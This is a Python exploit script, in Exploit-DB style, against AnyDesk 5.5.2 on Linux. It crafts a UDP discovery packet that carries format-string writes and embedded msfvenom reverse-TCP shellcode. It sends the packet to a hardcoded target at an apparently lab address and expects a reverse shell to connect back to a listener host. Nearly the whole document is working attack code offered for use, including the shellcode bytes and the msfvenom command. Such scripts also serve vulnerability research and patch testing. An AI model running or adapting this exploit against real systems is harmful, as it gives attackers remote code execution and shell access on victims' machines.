# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '10.10.215.185'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d


# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.3.193 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xd5\xb2\xa2"
shellcode += b"\x37\xfb\xf1\xe4\x2d\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xbf\x9b\xfa\xae\x91"
shellcode += b"\xf3\xbb\x47\xd4\xec\xad\x32\xb3\x66\xac\x94"
shellcode += b"\xd7\xb2\xb3\x6b\xf1\xfa\xe7\xec\x84\xfa\x2b"
shellcode += b"\xd1\x91\xe1\xbe\x47\xff\xea\xad\x32\x91\xf2"
shellcode += b"\xba\x65\x2a\x7c\xc8\x16\xa3\xfe\xe1\x58\x23"
shellcode += b"\xd8\x99\x6f\x62\xb9\x5f\x02\xb7\xdb\xcc\x18"
shellcode += b"\x88\x99\xe4\x7e\x9d\x3b\x45\x65\xac\xb9\x6d"
shellcode += b"\xcb\xda\xb7\xa2\x37\xfb\xf1\xe4\x2d"


print('sending payload ...')
concat_shellcode = b'\x85\xfe%1$*1$x%18x%165$ln'+shellcode
p = gen_discover_packet(4919, 1, concat_shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
